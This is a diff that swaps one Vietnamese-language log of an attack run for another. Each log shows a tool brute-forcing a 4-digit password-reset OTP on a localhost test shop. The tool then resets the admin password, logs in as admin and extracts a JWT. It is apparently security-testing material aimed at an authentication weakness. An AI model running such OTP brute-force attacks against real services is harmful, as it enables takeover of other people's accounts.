@@ -1,40 +1,43 @@
-[2026-10-18 16:39:42] [INFO] [+] [Record & Playback] Đã nạp thành công raw HTTP request từ ZAP: alert/reset_password.raw
-[2026-10-18 16:39:42] [INFO]     Target Endpoint: POST http://localhost:3000/api/reset-password
-[2026-10-18 16:39:42] [INFO] [*] [Giai đoạn 1] Khởi tạo yêu cầu đặt lại mật khẩu cho: admin@eshop.com
-[2026-10-18 16:39:42] [INFO]     Target: POST http://localhost:3000/api/forgot-password
-[2026-10-18 16:39:42] [INFO] [✔] Server phản hồi: Mã đặt lại mật khẩu đã được tạo
-[2026-10-18 16:39:42] [INFO]     [Thông tin kiểm chứng SUT] Server đã sinh OTP cho tài khoản: 6632
-[2026-10-18 16:39:43] [INFO] ================================================================================
-[2026-10-18 16:39:43] [INFO]  BẮT ĐẦU TẤN CÔNG VÉT CẠN OTP (A07 - Authentication Failures)
-[2026-10-18 16:39:43] [INFO]  Mục tiêu: admin@eshop.com | Dải OTP: [1000 - 9999]
-[2026-10-18 16:39:43] [INFO]  Không gian tìm kiếm: 9000 mã khả dĩ
-[2026-10-18 16:39:43] [INFO]  Số luồng tấn công song song: 30
-[2026-10-18 16:39:43] [INFO]  Nạp raw request: alert/reset_password.raw
-[2026-10-18 16:39:43] [INFO] ================================================================================
-[2026-10-18 16:39:43] [INFO] [*] Tiến độ vét cạn: Đã gửi 1 requests... Đang thử OTP ~ 1000
-[2026-10-18 16:39:44] [INFO] [*] Tiến độ vét cạn: Đã gửi 500 requests... Đang thử OTP ~ 1499
-[2026-10-18 16:39:44] [INFO] [*] Tiến độ vét cạn: Đã gửi 1000 requests... Đang thử OTP ~ 1999
-[2026-10-18 16:39:44] [INFO] [*] Tiến độ vét cạn: Đã gửi 1500 requests... Đang thử OTP ~ 2499
-[2026-10-18 16:39:45] [INFO] [*] Tiến độ vét cạn: Đã gửi 2000 requests... Đang thử OTP ~ 2999
-[2026-10-18 16:39:45] [INFO] [*] Tiến độ vét cạn: Đã gửi 2500 requests... Đang thử OTP ~ 3499
-[2026-10-18 16:39:45] [INFO] [*] Tiến độ vét cạn: Đã gửi 3000 requests... Đang thử OTP ~ 3999
-[2026-10-18 16:39:46] [INFO] [*] Tiến độ vét cạn: Đã gửi 3500 requests... Đang thử OTP ~ 4499
-[2026-10-18 16:39:46] [INFO] [*] Tiến độ vét cạn: Đã gửi 4000 requests... Đang thử OTP ~ 4999
-[2026-10-18 16:39:46] [INFO] [*] Tiến độ vét cạn: Đã gửi 4500 requests... Đang thử OTP ~ 5499
-[2026-10-18 16:39:46] [INFO] [*] Tiến độ vét cạn: Đã gửi 5000 requests... Đang thử OTP ~ 5999
-[2026-10-18 16:39:47] [INFO] [*] Tiến độ vét cạn: Đã gửi 5500 requests... Đang thử OTP ~ 6499
-[2026-10-18 16:39:47] [INFO] [★★★] TẤN CÔNG THÀNH CÔNG! ĐÃ TÌM THẤY OTP CHÍNH XÁC: 6632
-[2026-10-18 16:39:47] [INFO]       Phản hồi: Password reset successfully
-[2026-10-18 16:39:47] [INFO] --------------------------------------------------------------------------------
-[2026-10-18 16:39:47] [INFO] [✔] KẾT QUẢ: Tấn công THÀNH CÔNG!
-[2026-10-18 16:39:47] [INFO]     - Mã OTP giải mã thành công: 6632
-[2026-10-18 16:39:47] [INFO]     - Số lượt requests đã thử: 5660
-[2026-10-18 16:39:47] [INFO]     - Thời gian thực thi: 3.55 giây
-[2026-10-18 16:39:47] [INFO]     - Tốc độ vét cạn trung bình: 1595.5 requests/giây
-[2026-10-18 16:39:47] [INFO]     - Mật khẩu mới được thiết lập: PwnedAdmin2026!
-[2026-10-18 16:39:47] [INFO] [*] [Giai đoạn 3] Kiểm chứng chiếm quyền tài khoản (Account Takeover Verification)
-[2026-10-18 16:39:47] [INFO]     Target: POST http://localhost:3000/api/login với mật khẩu mới: PwnedAdmin2026!
-[2026-10-18 16:39:47] [INFO] [✔] ĐĂNG NHẬP THÀNH CÔNG! CHIẾM QUYỀN TÀI KHOẢN HOÀN TẤT!
-[2026-10-18 16:39:47] [INFO]     - User ID: 1 | Email: admin@eshop.com | Role: admin
-[2026-10-18 16:39:47] [INFO]     - JWT Token trích xuất: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ... (Độ dài: 135 chars)
-[2026-10-18 16:39:47] [INFO] --------------------------------------------------------------------------------
+[2026-10-27 11:07:43] [INFO] [+] [Record & Playback] Đã nạp thành công raw HTTP request từ ZAP: alert/reset_password.raw
+[2026-10-27 11:07:43] [INFO]     Target Endpoint: POST http://localhost:3000/api/reset-password
+[2026-10-27 11:07:43] [INFO] [*] [Giai đoạn 1] Khởi tạo yêu cầu đặt lại mật khẩu cho: admin@eshop.com
+[2026-10-27 11:07:43] [INFO]     Target: POST http://localhost:3000/api/forgot-password
+[2026-10-27 11:07:43] [INFO] [✔] Server phản hồi: Mã đặt lại mật khẩu đã được tạo
+[2026-10-27 11:07:43] [INFO]     [Thông tin kiểm chứng SUT] Server đã sinh OTP cho tài khoản: 8112
+[2026-10-27 11:07:44] [INFO] ================================================================================
+[2026-10-27 11:07:44] [INFO]  BẮT ĐẦU TẤN CÔNG VÉT CẠN OTP (A07 - Authentication Failures)
+[2026-10-27 11:07:44] [INFO]  Mục tiêu: admin@eshop.com | Dải OTP: [1000 - 9999]
+[2026-10-27 11:07:44] [INFO]  Không gian tìm kiếm: 9000 mã khả dĩ
+[2026-10-27 11:07:44] [INFO]  Số luồng tấn công song song: 30
+[2026-10-27 11:07:44] [INFO]  Nạp raw request: alert/reset_password.raw
+[2026-10-27 11:07:44] [INFO] ================================================================================
+[2026-10-27 11:07:44] [INFO] [*] Tiến độ vét cạn: Đã gửi 1 requests... Đang thử OTP ~ 1000
+[2026-10-27 11:07:44] [INFO] [*] Tiến độ vét cạn: Đã gửi 500 requests... Đang thử OTP ~ 1499
+[2026-10-27 11:07:45] [INFO] [*] Tiến độ vét cạn: Đã gửi 1000 requests... Đang thử OTP ~ 1999
+[2026-10-27 11:07:45] [INFO] [*] Tiến độ vét cạn: Đã gửi 1500 requests... Đang thử OTP ~ 2499
+[2026-10-27 11:07:45] [INFO] [*] Tiến độ vét cạn: Đã gửi 2000 requests... Đang thử OTP ~ 2999
+[2026-10-27 11:07:46] [INFO] [*] Tiến độ vét cạn: Đã gửi 2500 requests... Đang thử OTP ~ 3499
+[2026-10-27 11:07:46] [INFO] [*] Tiến độ vét cạn: Đã gửi 3000 requests... Đang thử OTP ~ 3999
+[2026-10-27 11:07:46] [INFO] [*] Tiến độ vét cạn: Đã gửi 3500 requests... Đang thử OTP ~ 4499
+[2026-10-27 11:07:47] [INFO] [*] Tiến độ vét cạn: Đã gửi 4000 requests... Đang thử OTP ~ 4999
+[2026-10-27 11:07:47] [INFO] [*] Tiến độ vét cạn: Đã gửi 4500 requests... Đang thử OTP ~ 5499
+[2026-10-27 11:07:47] [INFO] [*] Tiến độ vét cạn: Đã gửi 5000 requests... Đang thử OTP ~ 5999
+[2026-10-27 11:07:48] [INFO] [*] Tiến độ vét cạn: Đã gửi 5500 requests... Đang thử OTP ~ 6499
+[2026-10-27 11:07:48] [INFO] [*] Tiến độ vét cạn: Đã gửi 6000 requests... Đang thử OTP ~ 6999
+[2026-10-27 11:07:48] [INFO] [*] Tiến độ vét cạn: Đã gửi 6500 requests... Đang thử OTP ~ 7499
+[2026-10-27 11:07:49] [INFO] [*] Tiến độ vét cạn: Đã gửi 7000 requests... Đang thử OTP ~ 7999
+[2026-10-27 11:07:49] [INFO] [★★★] TẤN CÔNG THÀNH CÔNG! ĐÃ TÌM THẤY OTP CHÍNH XÁC: 8112
+[2026-10-27 11:07:49] [INFO]       Phản hồi: Password reset successfully
+[2026-10-27 11:07:49] [INFO] --------------------------------------------------------------------------------
+[2026-10-27 11:07:49] [INFO] [✔] KẾT QUẢ: Tấn công THÀNH CÔNG!
+[2026-10-27 11:07:49] [INFO]     - Mã OTP giải mã thành công: 8112
+[2026-10-27 11:07:49] [INFO]     - Số lượt requests đã thử: 7144
+[2026-10-27 11:07:49] [INFO]     - Thời gian thực thi: 4.99 giây
+[2026-10-27 11:07:49] [INFO]     - Tốc độ vét cạn trung bình: 1431.5 requests/giây
+[2026-10-27 11:07:49] [INFO]     - Mật khẩu mới được thiết lập: PwnedAdmin2026!
+[2026-10-27 11:07:49] [INFO] [*] [Giai đoạn 3] Kiểm chứng chiếm quyền tài khoản (Account Takeover Verification)
+[2026-10-27 11:07:49] [INFO]     Target: POST http://localhost:3000/api/login với mật khẩu mới: PwnedAdmin2026!
+[2026-10-27 11:07:49] [INFO] [✔] ĐĂNG NHẬP THÀNH CÔNG! CHIẾM QUYỀN TÀI KHOẢN HOÀN TẤT!
+[2026-10-27 11:07:49] [INFO]     - User ID: 1 | Email: admin@eshop.com | Role: admin
+[2026-10-27 11:07:49] [INFO]     - JWT Token trích xuất: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ... (Độ dài: 135 chars)
+[2026-10-27 11:07:49] [INFO] --------------------------------------------------------------------------------
